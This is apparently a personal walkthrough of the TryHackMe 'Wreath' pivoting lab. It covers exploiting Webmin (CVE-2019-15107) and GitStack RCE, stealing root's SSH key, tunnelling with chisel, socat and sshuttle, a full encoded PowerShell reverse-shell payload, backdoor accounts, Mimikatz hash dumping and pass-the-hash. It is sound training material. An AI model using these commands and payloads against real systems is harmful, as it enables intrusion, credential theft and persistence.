
# Wreath Room

Link to the room : https://tryhackme.com/room/wreath

My IP address : 10.50.156.24

My OS : Kali GNU/Linux 2021.2

## Gathered information about the network :

- There are three machines on the network, where at least one has public facing webserver turned on
- There is internal git server that is self-hosted somewhere in the network
- One of the machines has antivirus installes so we can assume this is Windows machine and we cannot acces it directly from the webserver

## Enumeration

First off we need to enumerate our target. There is only one IP provided for us (10.200.159.200) so we will start with this one.
```
sudo nmap -sSVC -p- 10.200.159.200

PORT    STATE   SERVICE and VERSION
22      open    ssh OpenSSH 8.0
80      open    http Apache 2.4.37 (centos)
443     open    ssl/http Apache 2.4.37 (centos)
9090    open    zeus-admin (probably not relevant)
10000   open    MiniServ 1.89 (webmin)
```
After that I usually scan the target again, with other parameters, to make sure that we didn't miss anything. For example :
```
sudo nmap -sV -p- -A -O 10.200.159.200 
```
We can't see any new services/ports but because of the -O parameter we get the 89% agressive OS guess that this machine is running Linux (we were able to retrieve this information
before from 80/443 port scan.

## Checking services

  ### HTTP
  
  After the enumeration we can check all of the available services. For example you can connect to the ssh `ssh root@10.200.159.200` and check if there is any banner shown.
  Next up we need to check the webpage. When we try to enter we are redirected to https://thomaswreath.thm/. As we can see there is no DNS that will resolve this for us. 
  To get access we need to edit our /etc/hosts file.
  ```
  10.200.159.200    thomaswreath.thm
  ```
  With that out of our way we are able to get access to this webpage where we are welcomed with resume website of Thomas Wreath.
  In real life penetration test you should "footprint" this person. That's what we will try to do but on a much lower scale. First up I will find everything that can be useful
  in the future that is on this website.
  1. Thomas' mobile phone number and phone number : +447821548812 and 01347 822945
  2. Thomas' address : 21 Highland Court in Yorkshire, England
  3. His mail : me@thomaswreath.thm

  Next up we can see that the page was done with the help of Online CV design by ThemeHippo. Sometimes it is useful information, for example when the site
  is made with wordpress.
  Normally we should enumerate this page with dirb/dirbuster/gobuster and maybe directory-list-2.3-medium.txt but for now we'll move on to the next service.
  
  ### Webmin HTTP
  
  We can start with checking if this version of the webmin is vulnerable to any exploit. Quick search with google gives us information that we wanted.
  On https://github.com/MuirlandOracle/ you are able to find the CVE-2019-15107 exploit that gives us unauthorized Remote Command Execution on this machine. 
  You can simply clone it onto your machine and install all of the requirements to run this exploit.
  ```
  git clone https://github.com/MuirlandOracle/CVE-2019-15107
  pip3 install -r requirements.txt
  chmod +x CVE-2019-15107.py
  ```
  After all of the requirements are satisfied we are able to obtain a reverse shell to the target machine.
  ```
  ./CVE-2019-15107.py 10.200.159.200
  ```
  Luckily this webserver is running as a root so we don't have to escalate our privileges! But still we have to stabilise our shell.
  There is this functionality to obtain a stable reverse shell with this CVE but I wasn't able to do it (couldn't type in my IP address and port where my netcat was listening)
  so I read the /.ssh/id_rsa file of root and connected through ssh to stabilise my shell.
  ```
  cat /root/.ssh/id_rsa
  nano id_rsa
  chmod 600 id_rsa
  ssh -i id_rsa root@10.200.159.200
  ```
  
 ## Pivoting
 
  Right now we are inside of first machine but we need to keep going and keep enumerating so we can start pivoting. Pivoting is the art of using access obtained over one machine
  to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing. There are two main methods of pivoting :
  - Tunnelling/Proxying - Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially
  also be tunnelled inside another protocol (e.g. SSH tunnelling) which can be useful for evading a basic IDS or firewall.
  - Port Forwarding - Creating a connection between a local port and a single port on a target via compromised host.
  
  Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed.
  
  ---
  
  ## Theory behind pivoting
  
  You can skip that part if you want to see only practical solutions for this room.
  Things that I'll focus on :
  - Proxy tools
  - Port forwarding methods
  - Stable linux shell with socat
  - Chisel as your proxy/port forwarding tool
  - sshuttle as your tunnelled proxy

  ### Proxy tool #1 - Proxychains
  
  Proxychains is a command line tool which is activated by prepending the command _proxychains_ to other commands. For example to proxy netcat it would look like this :
  ```
  proxychains nc 10.200.159.200 22
  ```
  The proxy port was not specified in the above command because proxychains reads its options from a config file (/etc/proxychains.conf). If you want to configure proxychains
  for a specific assignment you can copy this config file and make any changes in a copy stored in your current directory.
  
  One of the things to note when scanning through proxychains is that you can only use TCP scans. Because of that if you want to proxy nmap through proxychains you should always
  enable the -Pn switch to prevent from issuing ICMP echo requests.
  
  ### Proxy tool #2 - FoxyProxy
  
  This is an extension to your browser that you are probably already familiar with because a lot of pentesters use this tool to manage their BurpSuite/ZAP proxy quickly and
  easily. There is not much to say about this extension because it's really easy to use and manage.
  
  ### Forwarding connections
  
  Creating a forward SSH tunnel can be done if we have SSH access to the target machine. Port forwarding is accomplished with the -L switch which creates a link to a Local port.
  ```
  ssh -L 8000:10.200.159.200:80 user@10.200.159.200 -fN
  ```
  After execution we are able to get access to the default webpage of host 10.200.159.200 on http://127.0.0.1:8000/. The -fN switch backgrounds the shell immediately so that we 
  have our own terminal back and tells SSH that it doesn't need to execute any commands - only set up the connection. 
  
  Proxies are made using the -D switch. This is useful when combined with a tool such as proxychains.
  ```
  ssh -D 1336 user@10.200.159.200 -fN
  ```
  Having this proxy set up would allow us to route all of our traffic through into the target network.
  
  ### Reverse Connections
  
  These are riskier as you must access your attacking machine from the target - by using credentials or preferably key based system.
  First you need to generate a new set of SSH keys and store them somewhere safe `ssh-keygen`. Then you need to edit the /.ssh/authorized_keys file on your own
  attacking machine by adding :
  ```
  command="echo 'This account can only be used for port forwarding'",no-agen-forwarding,no-x11-forwarding,no-pty ssh-rsa <your public RSA key> 
  ```
  And finally you need to check the SSH service `sudo systemctl status ssh`. If it is up you can safely transfer your private key and proceed to setting up reverse connection.
  ```
  ssh -R <LOCAL PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<ATTACKING IP> -i id_rsa -fN
  ```
  To close any of these connections type `ps aux` and then `sudo kill PID`.
  
  ### Windows command line SSH
  
  Plink.exe is a tool that mimics the PuTTY SSH client in command line. The syntax of commands is really similar to linux SSH commands. 
  For example this is syntax to create a reverse connection :
  ```
  cmd.exe /c echo y | .\plink.exe -R <LOCAL PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<ATTACKING IP> -i id_rsa -N
  ```
  The `cmd.exe /c echo y` at the start is for non-interactive shells. Good thing to know is that keys generated by ssh-keygen will not work properly here.
  You will need to convert them using puttygen tool. 
  
  ### Socat
  
  With this tool every pentester should be familiar already. It's not just great for fully stable Linux shells, it's also superb for port forwarding.
  The biggest disadventage of socat is that it is very rarely installed by default on a target. But luckily you can easily find static binaries
  for both Windows and Linux. It's best to think of socat as a way to join two things together - kind of like the Portal gun. This could be two ports on the same machine, 
  it could be to create a connection between two different machines etc. 
  
  
  1. Reverse Shell Relay


      Attacker machine :
      ```
      sudo nc -lnvp 445
      ```
      Target machine :
      ```
      socat tcp-l:8000 tcp:<ATTACKING IP>:445 &
      ```
      In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. The ampersand & symbol at the end backgrounds
      this particular job.
  
  
  2. Port forwarding


      Target machine :
      ```
      socat tcp-l:<PORT TO RECEIVE>,fork,reuseaddr tcp:<TARGET IP>:<TARGET PORT> &
      ```
      Upon the execution we can connect to <PORT TO RECEIVE> and have our connection directly relayed to our intended target.

      To kill any of the jobs you created you need to simply find it in `jobs` and then `kill %<NUMBER OF THE JOB>`.

  ### Chisel
  
  It's an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH
  access or not. To work you must have an appropriate copy of the chisel binary on both the attacking machine and the compromised server. 
  
  
  1. Reverse SOCKS Proxy
  
  
      Attacker machine :
      ```
      chisel server -p <LISTEN PORT> --reverse &
      ```
      Target machine :
      ```
      chisel client <ATTACKING IP>:<LISTEN PORT> R:socks &
      ```
      This command connects back to the waiting listener on our attacking machine, completing the proxy. 
  
  
  2. Forward SOCKS Proxy
  
  
      Target machine :
      ```
      chisel server -p <LISTEN PORT> --socks5
      ```
      Attacker machine : 
      ```
      chisel client <TARGET IP>:<LISTEN PORT> <PROXY PORT>:socks
      ```
      In this command PROXY PORT is the port that will be opened for the proxy.

      ***Reminder*** 
      When sending data through either of these proxies we would need to est the port in our proxychains configuration. As chisel uses SOCKS5 proxy, we will also need
      to change the start of the line from socks4 to socks5.
  
  
  3. Remote Port Forward
  
  
      Attacker machine command is exact the same as with the Reverse SOCKS Proxy to setup a chisel listener to connect back to.
  
      Target machine :
      ```
      chisel client <ATTACKING IP>:<LISTEN PORT> R:<LOCAL PORT>:<TARGET IP>:<TARGET PORT> &
      ```
  
  
  4. Local Port Forward
  
  
      As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a target.
  
      Target machine :
      ```
      chisel server -p <LISTEN PORT>
      ```
      Attacker machine :
      ```
      chisel client <LISTEN IP>:<LISTEN PORT> <LOCAL PORT>:<TARGET IP>:<TARGET PORT>
      ```
  
  ### Sshuttle
  
  This tool is quite different because it doesn't perform a port forward, and the proxy it creates is nothing like the onew we have already seen.
  Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. It simulates a VPN, allowing us to route our traffic through the proxy
  without the use of proxychains. We can just directly connect to devices in the target network as we would normally connect to networked devices. we use sshuttle entirely
  on our attacking machine, in much the same way we would SSH into a remote server. But there are some drawbacks. For a start sshuttle only works on Linux targets, it also
  requires access to the target machine via SSH and the target machine must have python installed. 
  Sshuttle installing :
  ```
  sudo apt install sshuttle
  ```
  Base command for connecting to a server with sshuttle :
  ```
  sshuttle -r <USERNAME>@<TARGET IP> <TARGET SUBNET IP>
  ```
  But what happens if we don't have the user's password, or the server only accepts key-based authentication? Sshuttle doesn't currently seem to have a shorthand for specifying 
  a private key to authenticate to the server with. Because of that we use `--ssh-cmd` switch that allows us to specify what command gets executed by sshuttle.
  ```
  sshuttle -r <USERNAME>@<TARGET IP> --ssh-cmd "ssh -i <KEY FILE>" <TARGET SUBNET IP>
  ```
  If we are connecting to the target machine and this target machine is part of the subnet we're attempting to gain access to we can stumble upon error code 255 or
  "Broken pipe". To get around this we tell sshuttle to exclude the compromised server from the subnet range using the `-x` switch.
  ```
  sshuttle -r <USERNAME>@<TARGET IP> <TARGET SUBNET IP> -x <TARGET IP>
  ```
  
  ---
  
  ## Enumerating before pivoting
  
  Information is power - our first step when attempting to pivot through a network is to get an idea of what's around us. Ideally we want to take advantage of pre-installed
  tools on the system to enumerate a network through a compromised host. This is called Living off the Land (LotL) - a good way to minimise risk.
  ```
  ifconfig
  arp -a
  cat /etc/hosts
  cat /etc/resolv.conf
  ```
  Next up we will download a static nmap binary on our attacker machine and download it using python server and `curl` to our target machine. 
  ```
  sudo python3 -m http.server 80
  curl <ATTACKER IP>/nmap -o /tmp/nmap && chmod +x /tmp/nmap
  ```
  With that binary we can scan the network from target machine. We should get some interesting hosts and services.
  ```
  ./nmap -sn 10.200.159.1-255 -oN scan.txt
  ```
  If you don't already know `-sn` switch is used to tell nmap not to scan any port and instead just determine which hosts are alive. We can do the same with `fping`.
  After that we can focus only on those hosts that are alive instead of scanning the whole network and all ports. It would be waste of our time.
  ```
  Nmap scan report for ip-10-200-159-1.eu-west-1.compute.internal (10.200.159.1)
  Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
  Host is up (-0.18s latency).
  MAC Address: 02:98:7F:EB:16:FB (Unknown)
  Nmap scan report for ip-10-200-159-100.eu-west-1.compute.internal (10.200.159.100)
  Host is up (0.00016s latency).
  MAC Address: 02:81:EA:BC:A8:2F (Unknown)
  Nmap scan report for ip-10-200-159-150.eu-west-1.compute.internal (10.200.159.150)
  Host is up (0.00012s latency).
  MAC Address: 02:DC:AC:DE:3C:C3 (Unknown)
  Nmap scan report for ip-10-200-159-250.eu-west-1.compute.internal (10.200.159.250)
  Host is up (0.00017s latency).
  MAC Address: 02:B9:77:CE:A4:C7 (Unknown)
  Nmap scan report for ip-10-200-159-200.eu-west-1.compute.internal (10.200.159.200)
  Host is up.
  ```
  If we exclude our host and those hosts that are not in-scope we get two alive hosts - 10.200.159.100 and 10.200.159.150.
  ```
  nmap -p- 10.200.159.100,150
  
  10.200.159.150
  PORT  STATE   SERVICE
  80    open    http 
  3389  open    ms-wbt-server
  5985  open    wsman
  
  10.200.159.100
  We can assume that this host is not accessible from our current position in the network because all of the ports are filtered.
  ```
  Without proxy we cannot perform a service detection scan on the target so we will assume that those identified services are accurate. It seems that the most vulnerable service 
  is the http on port 80.
  
  ## Pivoting
  
  Right now we have to get access to the 10.200.159.150:80 machine using our root access on 10.200.159.200 machine. We can do that by simply creating an SSH connection between 
  our 10.50.156.24:8000 -> 10.200.159.200 -> 10.200.159.150:80.
  ```
  ssh -i id_rsa -L 8000:10.200.159.150:80 root@10.200.159.200 -fN
  ```
  When we visit our http://127.0.0.1/8000 web page we can see that default webpage was not found so we should try 3 other URLs. One of them is /gitstack which is working.
  As default credentials (admin:admin) doesn't work on this site we should look for any vulnerability in databases like https://www.exploit-db.com/ or searchsploit.
  What I found out is that there is a vulnerability in exploit-db without given CVE named "GitStack 2.3.10 - RCE". Let's try to use it.
  
  First of all we need to download it onto our attacker machine. We can copy it or git clone the entire directory, I prefer the first solution. Next up we should look through 
  the code to understand how it works and edit parameters like "ip" or "command". For my configuration it shoud look like this :
  ```
  ip = '127.0.0.1:8000'
  command = 'whoami'
  ```
  The command stays as it is because we want to know if this vulnerability even works. After those changes we can run this exploit with `python2 ./<NAME>` and get the output 
  `nt authority\system` which is really good for us because we don't have to escalate our privileges on this machine. From here we want to obtain a full reverse shell. 
  Another excelent fact is that this first run of the exploit creates a backdoor for us which we can use later for creating a reverse shell. Backdoor by default is in 
  http://127.0.0.1:8000/web/exploit.php and it uses "a=" parameter for commands. For example right now you can accomplish the same output with :
  ```
  curl -X POST http://127.0.0.1:8000/web/exploit.php -d "a=whoami"
  ```
  
  ### Windows Reverse Shell
  
  Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. Typical way to do this is to send some ICMP echo 
  requests to our attacker machine and see how many make it through the network. Let's start with the listener on our attacker machine :
  ```
  tcpdump -i <INTERFACE> icmp
  ```
  And try to ping it with :
  ```
  ping -n 3 <ATTACKING IP>
  ```
  As we can see we have no output at all. To work around it we have to either upload a static copy of netcat and just catch the shell here or set up a relay on .200 to forward 
  a shell back to a listener. I will choose first option. Ready binary you can find on anrew-d' github. But before we can do any work with netcat we have to get rid of CentOS 
  always-on wrapper around the IPTables firewall called "firewalld". By default this firewall is extremely restrictive and because of that we need to open our desired port in 
  the firewall.
  ```
  firewall-cmd --zone=public --add-port 20000/tcp
  ```
  After that we can upload to our root machine netcat binary and start listening on port 20000. On attacker machine we have to make curl/BurpSuite POST method with parameter "a" 
  set as our one-liner reverse powershell. You can get those one-liners on various of githubs (you have to know how to search!).
  
  If you want to use curl you need to encode this one-liner to URL standards. You can do this with https://urlencoder.org/. 
  ```
  curl -X POST http://127.0.0.1:8000/web/exploit.php -d "a=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.159.200%27%2C20000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22%0A"
  ```
  
  And just like this we got our powershell reverse shell. Easy, right?
  
  ## Post-exploitation of Windows Machine
  
  From the enumeration we know that ports 3389 and 5985 are open. This means that we should be able to obtain either a GUI through RDP (3389) or a stable CLI shell using WINRM 
  (5985). Specifically we need a user account with the "Remote Desktop Users" group for RDP or the "Remote Management Users" group for WinRM. We already have the ultimate 
  access so we can easily create such an accounts. 
  ```
  net user <USERNAME> <PASSWORD> /add
  net localgroup Administrators <USERNAME> /add
  net localgroup "Remote Management Users" <USERNAME> /add
  ```
  With that out of our way we can access this machine with evil-winrm or xfree-rdp.
  ```
  sudo gem install evil-winrm
  ssh -i id_rsa -L 8001:10.200.86.150:5985 root@10.200.159.200 -fN
  evil-winrm -u <USERNAME> -p <PASSWORD> -i 127.0.0.1 -P 8001
  ```
  If it comes to xfreerdp we are able to create a shared drive between the attacking machine and the target. We can do this with switch `/drive:`. A useful directory to share is 
  the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools including Mimikatz.
  ```
  ssh -i id_rsa -L 8002:10.200.86.150:3389 root@10.200.159.200 -fN
  xfreerdp /v:127.0.0.1:8002 /u:<USERNAME> /p:<PASSWORD> /drive:/usr/share/windows-resources,share
  ```
  
  ### Mimikatz
  
  With the shared Kali directory we are able to run Mimikatz from our cmd/powershell on xfreerdp setup. This gives us access to a very big database of post-exploitation tools 
  that we can use to e.g. dump all the hashes.
  ```
  \\tsclient\share\mimikatz\x64\mimikatz.exe
  privilege::debug
  token::elevate
  ```
  If your command line is running as Administrator everything should go swiftly. Next up you should dump all of the SAM local password hashes using `lsadump::sam`. Near the top 
  of the results you will se the Administrator's NTLM hash. We are not able to crack it but we can always try to crack other users passwords. For example Thomas' password is 
  really easy to crack and you can even use sites like https://crackstation.net/.
  
  As we were not able to crack the Administrators hash we can use it with evil-winrm built-in pass-the-hash technique using this hash to get Administrator access.
  ```
  evil-winrm -u Administrator -H <hash> -i 127.0.0.1 -P 8001
  ```
  Just like this we were able to establish a stable shell. But we should keep going deeper into the network.
  
  
  

  
  
